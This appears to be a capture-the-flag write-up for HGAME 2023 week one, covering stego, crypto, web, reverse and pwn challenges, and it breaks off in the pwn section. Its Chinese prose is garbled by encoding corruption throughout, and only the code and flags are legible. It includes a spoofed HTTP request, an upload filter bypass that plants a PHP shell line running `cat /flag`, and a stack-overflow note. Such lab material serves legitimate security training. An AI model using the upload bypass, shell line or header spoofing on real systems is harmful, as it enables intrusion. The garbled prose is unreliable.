å·¥å…·ç”¨6ä½æ•°å­—å¯†ç éšå†™ä¿¡æ¯ï¼Œçˆ†ç ´å¯†ç æå–ä¿¡æ¯ï¼š stegseek Bossanova.wav rockyou.txt è§£å‡ºå¯†ç ä¸º 123456ï¼Œéšå†™å†…å®¹ï¼šæ­å–œä½ è§£åˆ°è¿™é‡Œï¼Œå‰©ä¸‹çš„Flagæ˜¯ av^Mp3_Stego&#125;ï¼Œæˆ‘ä»¬Week2è§ï¼ flagï¼šhgame&#123;U_Kn0w_LSB&amp;Wav^Mp3_Stego&#125; â€‹ e99p1ant_want_girlfriend å…”å…”åœ¨æŠ¢ç¥¨ç½‘ç«™ä¸Šçœ‹åˆ°äº†ä¸€åˆ™ç›¸äº²å¹¿å‘Šï¼Œäººè¿˜æœ‰ç‚¹å°å¸…ï¼Œä½†è¿™ä¸ªå›¾ç‰‡ä¼¼ä¹æœ‰ç‚¹é—®é¢˜ï¼Œå¥½åƒæ˜¯CRCæ ¡éªŒä¸å¤ªæ­£ç¡®ï¼Ÿ 16è¿›åˆ¶ä¸‹ä¿®æ”¹pngå›¾ç‰‡çš„é«˜ä¸ºæ›´å¤§çš„å€¼ï¼Œå‘ç°flagï¼šhgame&#123;e99p1ant_want_a_girlfriend_qq_524306184&#125;ã€‚ â€‹ Cryptoå…”å…”çš„è½¦ç¥¨ å…”å…”åˆšä¹°åˆ°è½¦ç¥¨å°±æŠŠè½¦ç¥¨ä¸¢åˆ°ä¸€æ—ï¼Œè‡ªå·±å¿™å»äº†ã€‚ç»“æœå†å»æ‰¾è½¦ç¥¨æ—¶å‘ç°åŸæ¥çš„è½¦ç¥¨æ··åœ¨äº†å…¶ä»–ä¸œè¥¿é‡Œï¼Œè€Œä¸”ç¥¨é¢è¿˜è¢«æ±¡æŸ“äº†ã€‚ä½ èƒ½å¸®å…”å…”æ‰¾åˆ°å®ƒçš„è½¦ç¥¨å—ã€‚ æ³¨ï¼šflag.pngå·²ç»æå‰ä¿å­˜åœ¨sourceæ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶ä¸”å‘½åä¸ºpicture{x}.png 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from PIL import Imagefrom Crypto.Util.number import *from random import shuffle, randint, getrandbitsflagImg = Image.open(&#x27;flag.png&#x27;)width = flagImg.widthheight = flagImg.heightdef makeSourceImg(): colors = long_to_bytes(getrandbits(width * height * 24))[::-1] img = Image.new(&#x27;RGB&#x27;, (width, height)) x = 0 for i in range(height): for j in range(width): img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2])) x += 3 return imgdef xorImg(keyImg, sourceImg): img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return img&quot;&quot;&quot;sourceæ–‡ä»¶å¤¹ä¸‹é¢çš„å›¾ç‰‡ç”Ÿæˆè¿‡ç¨‹ï¼šdef makeImg(): colors = list(long_to_bytes(getrandbits(width * height * 23)).zfill(width * height * 24)) shuffle(colors) colors = bytes(colors) img = Image.new(&#x27;RGB&#x27;, (width, height)) x = 0 for i in range(height): for j in range(width): img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2])) x += 3 return imgfor i in range(15): im = makeImg() im.save(f&quot;./source/picture&#123;i&#125;.png&quot;)&quot;&quot;&quot;n1 = makeSourceImg()n2 = makeSourceImg()n3 = makeSourceImg()nonce = [n1, n2, n3]index = list(range(16))shuffle(index)e=0&quot;&quot;&quot;è¿™é‡Œflag.pngå·²ç»æå‰è¢«ä¿å­˜åœ¨sourceæ–‡ä»¶å¤¹ä¸‹äº†ï¼Œæ–‡ä»¶åä¹Ÿæ˜¯picture&#123;xx&#125;.png&quot;&quot;&quot;for i in index: im = Image.open(f&quot;source/picture&#123;i&#125;.png&quot;) key = nonce[randint(0, 2)] encImg = xorImg(key, im) encImg.save(f&#x27;pics/enc&#123;e&#125;.png&#x27;) e+=1 15å¼ éšæœºæ˜æ–‡å›¾ç‰‡ $P_{m_k},k \\in [1,15]$ ä¸1å¼ flagå›¾ç‰‡ $P_f$ï¼Œç»è¿‡3å¼ å¯†é’¥å›¾ç‰‡ $P_k,k \\in [1,3]$ éšæœºå¼‚æˆ–å¾—åˆ°å¯†æ–‡å›¾ç‰‡ $P_{c_k}, k \\in [1,16]$ï¼Œåœ¨éšæœºç”Ÿæˆæ˜æ–‡å›¾ç‰‡çš„ makeImg() å‡½æ•°ä¸­æœ‰æ¦‚ç‡ç”Ÿæˆåƒç´ ä¸º (0,0,0) çš„ç‚¹ï¼Œè¿™äº›ç‚¹åœ¨éšæœºå¼‚æˆ–æ“ä½œåï¼Œå¯†æ–‡å›¾ç‰‡ä¸å¯†é’¥å›¾ç‰‡å¯¹åº”çš„è¯¥ç‚¹åƒç´ å€¼ç›¸åŒï¼Œåˆ™æœ‰ï¼š flagå›¾ç‰‡å¯¹åº”çš„å¯†æ–‡å›¾ç‰‡ï¼š$P_{c_f}(x,y) = P_{f}(x,y) \\oplus P_{k_a}(x,y)$ éflagéšæœºæ˜æ–‡å›¾ç‰‡å¯¹åº”çš„å¯†æ–‡å›¾ç‰‡ï¼š $P_{c_i}(x,y) = P_{m_i}(x,y) \\oplus P_{k_b}(x,y)$ï¼Œ å½“æ»¡è¶³ $a=b$ æ—¶ï¼Œå³æ‰¾åˆ°ä½¿ç”¨ç›¸åŒå¯†é’¥å›¾ç‰‡åŠ å¯†çš„ä¸¤ç»„åŸå§‹å›¾ç‰‡ï¼Œæœ‰ $P_{k_a}(x,y)=P_{k_b}(x,y)$ï¼Œ åˆ™ $P_{c_f}(x,y) \\oplus P_{c_i}(x,y) = P_{f}(x,y) \\oplus P_{m_i}(x,y)$ï¼› åˆæœ‰å¤§éƒ¨åˆ†éšæœºæ˜æ–‡å›¾ç‰‡çš„ç‚¹çš„åƒç´ å€¼ä¸º (0,0,0)ï¼Œå³ $P_{m_i}(x_0,y_0)=0$ï¼Œåˆ™ $P_{c_f}(x_0,y_0) \\oplus P_{c_i}(x_0,y_0) = P_{f}(x_0,y_0) \\oplus P_{m_i}(x_0,y_0)=P_{f}(x_0,y_0)$ æœ‰å¾ˆå¤§æ¦‚ç‡å¯ä»¥æ¢å¤flagå›¾ç‰‡ã€‚ åªéœ€æ‰¾åˆ°æ»¡è¶³ $a=b$ çš„ä½¿ç”¨ç›¸åŒå¯†é’¥å›¾ç‰‡åŠ å¯†çš„ä¸¤ç»„åŸå§‹å›¾ç‰‡å³å¯ï¼Œé€šè¿‡çˆ†ç ´éå†ã€‚ 123456789101112131415161718from PIL import Imagewidth = 379height = 234def xorImg(keyImg, sourceImg): img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return imgfor i in range(16): for j in range(16): img1 = Image.open(f&#x27;pics/enc&#123;i&#125;.png&#x27;) img2 = Image.open(f&#x27;pics/enc&#123;j&#125;.png&#x27;) img = xorImg(img1, img2) img.save(f&#x27;out/img_&#123;i&#125;_&#123;j&#125;.png&#x27;) å¾—åˆ°è¿˜åŸçš„flagå›¾ç‰‡ï¼Œflagï¼šhgame&#123;Oh_my_Ticket&#125;ã€‚ â€‹ RSA ä¼—æ‰€å‘¨çŸ¥ï¼ŒRSAçš„å®‰å…¨æ€§åŸºäºæ•´æ•°åˆ†è§£éš¾é¢˜ã€‚ 1234567891011121314151617from Crypto.Util.number import *flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()p = getPrime(512)q = getPrime(512)n=p*qe = 65537m = bytes_to_long(flag)c = pow(m, e, n)print(f&quot;c=&#123;c&#125;&quot;)print(f&quot;n=&#123;n&#125;&quot;)&quot;&quot;&quot;c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789&quot;&quot;&quot; $n$ åˆ†è§£å‡º $p,q$ï¼Œå¸¸è§„RSAã€‚ 123456789101112p = 11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813q = 12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953n = p*qc = 110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582e = 65537f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# hgame&#123;factordb.com_is_strong!&#125; â€‹ Be Stream å¾ˆå–œæ¬¢æå°é¾™å…ˆç”Ÿçš„ä¸€å¥è¯â€Be water my friendâ€ï¼Œä½†æ˜¯è¿™æ¡å°æºªçš„æ°´å¥½åƒå¤ªå¤šäº†ã€‚ 1234567891011121314151617181920from flag import flagassert type(flag) == byteskey = [int.from_bytes(b&quot;Be water&quot;, &#x27;big&#x27;), int.from_bytes(b&quot;my friend&quot;, &#x27;big&#x27;)]def stream(i): if i==0: return key[0] elif i==1: return key[1] else: return (stream(i-2)*7 + stream(i-1)*4)enc = b&quot;&quot;for i in range(len(flag)): water = stream((i//2)**6) % 256 enc += bytes([water ^ flag[i]])print(enc)# b&#x27;\\x1a\\x15\\x05\\t\\x17\\tu&quot;-\\x06lm\\x01-\\xc7\\xcc2\\x1eXA\\x1c\\x15\\xb7\\xdb\\x06\\x13\\xaf\\xa1-\\x0b\\xd4\\x91-\\x06\\x8b\\xd4-\\x1e\\xab\\xaa\\x15-\\xf0\\xed\\x1f\\x17\\x1bY&#x27; é€’æ¨å…³ç³»ç­‰åŒäºçŸ©é˜µè¿ç®—ï¼š $s_i=4s_{i-1}+7s_{i-2}\\Longrightarrow \\begin{bmatrix} s_i \\\\ s_{i-1} \\end{bmatrix}=\\begin{bmatrix} 4 &amp; 7 \\\\ 1 &amp; 0 \\end{bmatrix}\\begin{bmatrix} s_{i-1} \\\\ s_{i-2} \\end{bmatrix}=\\begin{bmatrix} 4 &amp; 7 \\\\ 1 &amp; 0 \\end{bmatrix}^{i-1}\\begin{bmatrix} s_1 \\\\ s_0 \\end{bmatrix}$ åˆ©ç”¨çŸ©é˜µå¿«é€Ÿå¹‚å¿«é€Ÿæ±‚å€¼å³å¯ã€‚ 12345678910111213141516171819# Sageenc = list(b&#x27;\\x1a\\x15\\x05\\t\\x17\\tu&quot;-\\x06lm\\x01-\\xc7\\xcc2\\x1eXA\\x1c\\x15\\xb7\\xdb\\x06\\x13\\xaf\\xa1-\\x0b\\xd4\\x91-\\x06\\x8b\\xd4-\\x1e\\xab\\xaa\\x15-\\xf0\\xed\\x1f\\x17\\x1bY&#x27;)key = [int.from_bytes(b&quot;Be water&quot;, &#x27;big&#x27;), int.from_bytes(b&quot;my friend&quot;, &#x27;big&#x27;)]s0, s1 = keyM = matrix(Zmod(256), [[4,7],[1,0]])A = vector(Zmod(256), [s1,s0])def stream(x): return (M^(x-1)*A)[0]flag = []for i in range(len(enc)): water = stream((i//2)**6) flag += [(int(water) ^^ int(enc[i])) % 128] print(bytes(flag))# b&#x27;hgame&#123;1f_this_ch@l|eng3_take_y0u_to0_long_time?&#125;&#x27; â€‹ ç¥ç§˜çš„ç”µè¯ å­¦æ ¡çªç„¶æ”¾å‡äº†ï¼Œtr0ubleæ­£åœ¨å¼€å¼€å¿ƒå¿ƒçš„æ”¶æ‹¾ä¸œè¥¿å‡†å¤‡å›å®¶ï¼Œä½†æ˜¯æ‰‹æœºé“ƒå£°çªç„¶å“èµ·ï¼Œtr0ubleæ¥èµ·ç”µè¯ï¼Œä½†æ˜¯åªå¬åˆ°æ»´ç­”æ»´ç­”çš„å£°éŸ³ã€‚åŠªåŠ›å­¦ä¹ å¯†ç å­¦çš„tr0ubleä¸€å¬å°±çŸ¥é“è¿™æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯é©¬ä¸Šè®°å½•ä¸‹æ¥å¹¶èŠ±äº†äº¿ç‚¹æ—¶é—´æˆåŠŸç ´è¯‘äº†ï¼Œä½†æ˜¯æ€ä¹ˆçœ‹è¿™éƒ½ä¸åƒæ˜¯äººèƒ½çœ‹æ‡‚çš„ï¼Œè¿˜æ²¡ç­‰tr0ubleååº”è¿‡æ¥ï¼Œåˆä¸€é€šç”µè¯æ‰“æ¥ï¼Œä¾ç„¶æ˜¯æ»´ç­”æ»´ç­”çš„å£°éŸ³ã€‚tr0ubleæƒ³åˆ°å…”å…”ä¹Ÿåœ¨å­¦ä¹ å¯†ç å­¦ï¼Œäºæ˜¯ä¸è´Ÿè´£ä»»åœ°æŠŠå¯†æ–‡éƒ½äº¤ç»™äº†å…”å…”ï¼Œå…”å…”æ”¶åˆ°å¯†æ–‡åéšä¾¿çœ‹äº†ä¸€çœ¼å°±ä¸å±‘åœ°è¯´â€è¿™ä¹ˆç®€å•éƒ½ä¸ä¼šï¼Ÿè‡ªå·±è§£å»ï¼Œåˆ«è€½è¯¯æˆ‘æŠ¢è½¦ç¥¨â€ã€‚ flagä¸ºæœ€åå¾—åˆ°çš„ç»“æœå¥—ä¸Šhgame{}, flagä¸­å­—æ¯å‡ä¸ºå°å†™ txtæ–‡ä»¶ä¸­æœ‰æç¤ºï¼š å‡ ä¸ªæ˜ŸæœŸå‰ï¼Œæˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ªç¥ç§˜çš„æ¶ˆæ¯ã€‚ä½†æ˜¯è¿™ä¸ªæ¶ˆæ¯è¢«é‡é‡åŠ å¯†ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å®ƒçš„çœŸæ­£å«ä¹‰æ˜¯ä»€ä¹ˆã€‚å”¯ä¸€çŸ¥é“çš„ä¿¡æ¯æ˜¯å…³äºå¯†é’¥çš„ï¼šâ€œåªæœ‰å€’ç€ç¿»è¿‡åå…«å±‚çš„ç¯±ç¬†æ‰èƒ½æŠµè¾¾åŒ—æ¬§ç¥è¯çš„ç»ˆç‚¹â€ã€‚ ä»wavæ–‡ä»¶ä¸­æ‰‹æ“æ‘©æ–¯å¯†ç ï¼š ----- ..--- ..--- ...-- . ..--.- .--. .-. .. .. -... .-.. -.-- ..--.- ..--.- .... --- -. .-- .- ..--.- .--- -- --. .... ..--.- ..-. --. -.- -.-. --.- .- --- --.- - -- ..-. .-. è§£ç ï¼š0223e_priibly__honwa_jmgh_fgkcqaoqtmfr æ ¹æ®txtæç¤ºï¼Œå­—ç¬¦ä¸²é€†åº + æ …æ å¯†ç ï¼ˆ18æ ï¼‰ å¾—åˆ°ï¼šrmocfhm_wo_ybipe2023_ril_hnajg_katfqqg ç”± 2023 çŒœæµ‹ ybipe å¯¹åº” hgameï¼Œå°è¯•Vigenereå¯†ç ï¼Œå¯†é’¥ vidarï¼Œå¾—åˆ°ï¼šwelcome_to_hgame2023_and_enjoy_hacking flagï¼šhgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125; â€‹ WebClassic Childhood Game å…”å…”æœ€è¿‘è¿·ä¸Šäº†ä¸€ä¸ªçº¯å‰ç«¯å®ç°çš„ç½‘é¡µå°æ¸¸æˆï¼Œä½†æ˜¯å¥½åƒæœ‰ç‚¹éš¾ç©ï¼Œå¿«å¸®å…”å…”é€šå…³æ¸¸æˆï¼ jsæ¸¸æˆï¼ŒæŸ¥çœ‹æºç ï¼Œåœ¨ /Res/Events.js ä¸­æ‰¾åˆ°å…³é”®å‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function mota() &#123; var a = [&#x27;\\x59\\x55\\x64\\x6b\\x61\\x47\\x4a\\x58\\x56\\x6a\\x64\\x61\\x62\\x46\\x5a\\x31\\x59\\x6d\\x35\\x73\\x53\\x31\\x6c\\x59\\x57\\x6d\\x68\\x6a\\x4d\\x6b\\x35\\x35\\x59\\x56\\x68\\x43\\x4d\\x45\\x70\\x72\\x57\\x6a\\x46\\x69\\x62\\x54\\x55\\x31\\x56\\x46\\x52\\x43\\x4d\\x46\\x6c\\x56\\x59\\x7a\\x42\\x69\\x56\\x31\\x59\\x35&#x27;]; (function (b, e) &#123; var f = function (g) &#123; while (--g) &#123; b[&#x27;push&#x27;](b[&#x27;shift&#x27;]()); &#125; &#125;; f(++e); &#125;(a, 0x198)); var b = function (c, d) &#123; c = c - 0x0; var e = a[c]; if (b[&#x27;CFrzVf&#x27;] === undefined) &#123; (function () &#123; var g; try &#123; var i = Function(&#x27;return\\x20(function()\\x20&#x27; + &#x27;&#123;&#125;.constructor(\\x22return\\x20this\\x22)(\\x20)&#x27; + &#x27;);&#x27;); g = i(); &#125; catch (j) &#123; g = window; &#125; var h = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;; g[&#x27;atob&#x27;] || (g[&#x27;atob&#x27;] = function (k) &#123; var l = String(k)[&#x27;replace&#x27;](/=+$/, &#x27;&#x27;); var m = &#x27;&#x27;; for (var n = 0x0, o, p, q = 0x0; p = l[&#x27;charAt&#x27;](q++); ~p &amp;&amp; (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? m += String[&#x27;fromCharCode&#x27;](0xff &amp; o &gt;&gt; (-0x2 * n &amp; 0x6)) : 0x0) &#123; p = h[&#x27;indexOf&#x27;](p); &#125; return m; &#125;); &#125;()); b[&#x27;fqlkGn&#x27;] = function (g) &#123; var h = atob(g); var j = []; for (var k = 0x0, l = h[&#x27;length&#x27;]; k &lt; l; k++) &#123; j += &#x27;%&#x27; + (&#x27;00&#x27; + h[&#x27;charCodeAt&#x27;](k)[&#x27;toString&#x27;](0x10))[&#x27;slice&#x27;](-0x2); &#125; return decodeURIComponent(j); &#125;; b[&#x27;iBPtNo&#x27;] = &#123;&#125;; b[&#x27;CFrzVf&#x27;] = !![]; &#125; var f = b[&#x27;iBPtNo&#x27;][c]; if (f === undefined) &#123; e = b[&#x27;fqlkGn&#x27;](e); b[&#x27;iBPtNo&#x27;][c] = e; &#125; else &#123; e = f; &#125; return e; &#125;; alert(atob(b(&#x27;\\x30\\x78\\x30&#x27;)));&#125; åœ¨æ§åˆ¶å°ä¸­è¿è¡Œï¼Œå¼¹çª—å†…å®¹å³ä¸ºflagï¼šhgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;ã€‚ â€‹ Become A Member å­¦æ ¡é€šçŸ¥æ”¾å¯’å‡å•¦ï¼Œå…”å…”å…´é«˜é‡‡çƒˆçš„æ‰“ç®—è´­ä¹°å›å®¶çš„è½¦ç¥¨ï¼Œè¿™æ—¶å…”å…”å‘ç°æˆä¸ºè´­ç¥¨ç½‘ç«™çš„ä¼šå‘˜è´¦æˆ·å¯ä»¥çœä¸‹ä¸€ç¬”moneyâ€¦â€¦ æƒ³æˆä¸ºä¼šå‘˜ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦ä¸€ç‚¹ç‚¹HTTPçš„çŸ¥è¯†â€¦â€¦ç­‰ä¸‹ï¼ŒHTTPæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥åƒå— è€ƒå¯ŸHTTPè¯·æ±‚å¤´ä¸­çš„User-Agentã€Cookieã€æ¥æº(Referer)å’Œæœ¬åœ°è®¿é—®(X-Forwarded-For)ã€‚ éœ€ä¾æ¬¡æ»¡è¶³ï¼š 12345678User-Agent: Cute-BunnyCookie: code=VidarReferer: bunnybunnybunny.comX-Forwarded-For: 127.0.0.1JSONusername=luckytodaypassword=happy123 ä»¥JSONæ ¼å¼è¯·æ±‚ç™»å½•å³å¯ï¼š 12345678910111213141516GET / HTTP/1.1Host: week-1.hgame.lwsec.cn:31450Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Cute-BunnyReferer: bunnybunnybunny.comX-Forwarded-For: 127.0.0.1Content-Type: application/jsonAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6Cookie: code=VidarConnection: closeContent-Length: 47&#123;&quot;username&quot;:&quot;luckytoday&quot;,&quot;password&quot;:&quot;happy123&quot;&#125; è¿”å›flagå€¼ï¼šhgame&#123;H0w_ArE_Y0u_T0day?&#125;ã€‚ â€‹ Guess Who I Am åˆšåŠ å…¥Vidarçš„å…”å…”è¿˜è®¤ä¸æ¸…åä¼šæˆå‘˜è¯¶ï¼Œå­¦é•¿è¦æ±‚çš„ç­”å¯¹100æ¬¡é—®é¢˜å¯å¤ªéš¾äº†ï¼Œä½ èƒ½å¸®å…”å…”å†™ä¸ªè„šæœ¬ç­”é¢˜å—ï¼Ÿ æŸ¥çœ‹æºç ï¼š &lt;!-- Hint: https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js --&gt; è®¿é—®å‘ç°ä¸ºé¡µé¢é—®é¢˜çš„ç­”æ¡ˆï¼Œä»¥listæ–¹å¼æå–æ•°æ®ã€‚ å¦åœ¨jsæ–‡ä»¶ä¸­æœç´¢å‘ç°é¡µé¢çš„3ä¸ªè·¯ç”±ï¼š è·å–é—®é¢˜ï¼š/api/getQuestionï¼ŒéªŒè¯ç­”æ¡ˆï¼š/api/verifyAnswerï¼Œè·å–åˆ†æ•°ï¼š/api/getScoreã€‚ pythonè„šæœ¬æ¨¡æ‹Ÿé¡µé¢100æ¬¡å›ç­”ï¼š 123456789101112131415161718192021222324data = [ &#123; &quot;id&quot;: &quot;ba1van4&quot;, &quot;intro&quot;: &quot;21çº§ / ä¸ä¼šRe / ä¸ä¼šç¾å·¥ / æ´»åœ¨æ¢¦é‡Œ / å–œæ¬¢åšä¸ä¼šçš„äº‹æƒ… / â—¼â—»ç²‰&quot;, &quot;avatar&quot;: &quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;, &quot;url&quot;: &quot;https://ba1van4.icu&quot; &#125;, ......]dic = &#123;&#125;for k in data: dic[k[&quot;intro&quot;]] = k[&quot;id&quot;]s = requests.Session()url = &#x27;http://week-1.hgame.lwsec.cn:xxxxx&#x27;for i in range(100): r = s.get(url+&#x27;/api/getQuestion&#x27;) intro = json.loads(r.text)[&quot;message&quot;] #print(intro) r = s.post(url+&#x27;/api/verifyAnswer&#x27;, data=&#123;&#x27;id&#x27;:dic[intro]&#125;) r = s.get(url+&#x27;/api/getScore&#x27;) print(r.text) è¿è¡Œå¾—åˆ°100æ¬¡å¾ªç¯åçš„ç»“æœï¼š&#123;&quot;message&quot;:&quot;hgame&#123;Guess_who_i_am^Happy_Crawler&#125;&quot;&#125;ã€‚ â€‹ Show Me Your Beauty ç™»é™†äº†ä¹‹å‰è·å–çš„ä¼šå‘˜è´¦å·ä¹‹åï¼Œå…”å…”æƒ³æ‰¾ä¸€å¼ è‡ªå·±çš„å¯çˆ±ç…§ç‰‡ï¼Œä¸Šä¼ åˆ°ä¸ªäººä¿¡æ¯çš„å¤´åƒä¸­ :D ä¸è¿‡å¥½åƒå¯ä»¥ä¸Šä¼ äº›å¥‡æ€ªåç¼€åçš„æ–‡ä»¶è¯¶ XD å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ ï¼ŒæŠ“åŒ…å°è¯•ï¼Œæ–‡ä»¶åå­˜åœ¨å…³é”®å­—é»‘åå•ï¼ŒåŒ…æ‹¬ php/phtml/ini/htaccess ç­‰ï¼› æµ‹è¯•å‘ç°å¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Œå°†æ–‡ä»¶ååç¼€ä¿®æ”¹ä¸º Phpï¼Œå†…å®¹ä¿®æ”¹ä¸º &lt;?=`cat /flag`;ï¼Œä¸Šä¼  1.Phpï¼Œè®¿é—®å³å¯å¾—åˆ°flagï¼šhgame&#123;Unsave_F1L5_SYS7em_UPL0ad!&#125;ã€‚ â€‹ Reversetest your IDA ç­¾åˆ° IDAæ‰“å¼€æŸ¥çœ‹å­—ç¬¦ä¸²æœ‰flagï¼šhgame&#123;te5t_y0ur_IDA&#125;ã€‚ â€‹ easyasm éå¸¸ç®€å•çš„æ±‡ç¼– å…³é”®æ“ä½œåœ¨ xor eax, 33hï¼Œå°†ç»“æœå¼‚æˆ–0x33å³å¯è¿˜åŸï¼š 12345c = [0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]flag = [k^0x33 for k in c]print(bytes(flag))# b&#x27;hgame&#123;welc0me_t0_re_wor1d!&#125;&#x27; â€‹ easyenc easyenc ä»£ç é€»è¾‘ä¸ºé€å­—ç¬¦å…ˆå¼‚æˆ–0x32åå‡86ï¼Œé€†å‘è¿˜åŸï¼š 12345678910c = [4, 255, 253, 9, 1, 243, 176, 0, 0, 5, 240, 173, 7, 6, 23, 5, 235, 23, 253, 23, 234, 1, 238, 1, 234, 177, 5, 250, 8, 1, 23, 172, 236, 1, 234, 253, 240, 5, 7, 6, 249]flag = [((k+86)^0x32) &amp; 0xff for k in c]print(bytes(flag))# b&#x27;hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;&#x27; â€‹ a_cup_of_tea å…”å…”çš„å®¶äººéƒ½çˆ±å–èŒ¶ï¼Œæ‰€ä»¥å…”å…”å¸¦äº†äº›èŒ¶å¶å›å» é­”æ”¹äº†deltaä¸º 0xABCDEF23 çš„Teaç®—æ³•ï¼Œç”¨è§£å¯†ç®—æ³•è¿˜åŸï¼š 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xABCDEF23 * 32 delta = 0xABCDEF23 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: c = [0x2E63829D, 0xC14E400F, 0x9B39BFB9, 0x5A1F8B14, 0x61886DDE, 0x6565C6CF, 0x9F064F64, 0x236A43F6, 0x7D6B] cc = [long_to_bytes(k)[::-1] for k in c] key = [0x12345678, 0x23456789, 0x34567890, 0x45678901] flag = b&#x27;&#x27; for i in range(len(c)//2): d = decrypt(c[2*i:2*(i+1)], key) flag += long_to_bytes(d[0])[::-1]+long_to_bytes(d[1])[::-1] flag += long_to_bytes(c[-1])[::-1] print(flag) # b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27; â€‹ encode å…”å…”æŠŠè‡ªå·±è¡Œæç®±çš„å¯†ç ç”¨ä¸€ç§ç¼–ç å†™åœ¨äº†çº¸æ¡ä¸Šï¼Œä½†ä»–å¿˜äº†æ€ä¹ˆè§£å¯†ï¼Œä½ èƒ½å¸®å¸®ä»–å—ï¼Ÿ ä»£ç é€»è¾‘ä¸ºå°†ä½4ä½å’Œé«˜4ä½åˆ†åˆ«å–å‡ºå­˜å…¥ v4[2*i] å’Œ v4[2*i+1]ï¼Œæå–æ¯”å¯¹å­—ç¬¦ä¸² dword_403000ï¼Œé€†å‘è¿˜åŸï¼š 123456789c = [8, 6, 7, 6, 1, 6, 13, 6, 5, 6, 11, 7, 5, 6, 14, 6, 3, 6, 15, 6, 4, 6, 5, 6, 15, 5, 9, 6, 3, 7, 15, 5, 5, 6, 1, 6, 3, 7, 9, 7, 15, 5, 6, 6, 15, 6, 2, 7, 15, 5, 1, 6, 15, 5, 2, 7, 5, 6, 6, 7, 5, 6, 2, 7, 3, 7, 5, 6, 15, 5, 5, 6, 14, 6, 7, 6, 9, 6, 14, 6, 5, 6, 5, 6, 2, 7, 13, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]flag = &#x27;&#x27;for i in range(len(c)//2): flag += chr((c[2*i+1] &lt;&lt; 4) + c[2*i])print(flag)# hgame&#123;encode_is_easy_for_a_reverse_engineer&#125; â€‹ Pwntest_ncpwnç­¾åˆ°ï¼Œç›´æ¥ cat flag å¾—flagã€‚ â€‹ easy_overflowç®€å•æ ˆæº¢å‡ºåˆ° b4ckd0or() å‡½æ•°ä¸Šï¼Œç‰¹åˆ«çš„ä¸€ç‚¹æ˜¯ç”¨ close(1) å…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œå¯ä»¥ç”¨ execv 1&gt;&amp;0 å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œå› ä¸ºé»˜è®¤æ‰“å¼€ä¸€ä¸ªç»ˆç«¯åï¼Œ0/1/2éƒ½æŒ‡å‘åŒä¸€ä¸ªä½ç½®ä¹Ÿå°±æ˜¯å½“å‰ç»ˆç«¯ï¼Œæ‰€ä»¥è¿™æ¡è¯­å¥ç›¸å½“äºé‡å¯äº†æ 